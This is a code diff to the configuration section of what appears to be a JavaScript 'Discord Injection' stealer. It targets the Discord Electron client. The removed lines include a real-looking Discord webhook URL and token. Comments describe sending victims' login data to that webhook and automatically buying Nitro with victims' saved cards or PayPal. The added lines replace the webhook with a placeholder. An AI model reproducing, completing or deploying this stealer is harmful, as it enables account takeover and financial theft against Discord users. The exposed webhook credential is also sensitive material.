@@ -6,18 +6,16 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: 'https://discord.com/api/webhooks/986751290661032026/0VekoB25e1hlqkVFUojkM-iUiY755palSOr1gEE8l6OA2ZrirqdYC8kVp-7tXib-f8ah', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using
-  auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-  ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
-  ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
-  embed_icon: ''.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-  embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: '', //injection url for when it reinjects
-  /**
-   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
-   **/
+  webhook: '%WEBHOOK%',
+  webhook_protector_key: '%WEBHOOK_KEY%', 
+  auto_buy_nitro: true, 
+  ping_on_run: false, 
+  ping_val: '@everyone',
+  embed_name: 'Discord Injection',
+  embed_icon: ''.replace(/ /g, '%20'),
+  embed_color: 8363488,
+  injection_url: '', 
+ 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
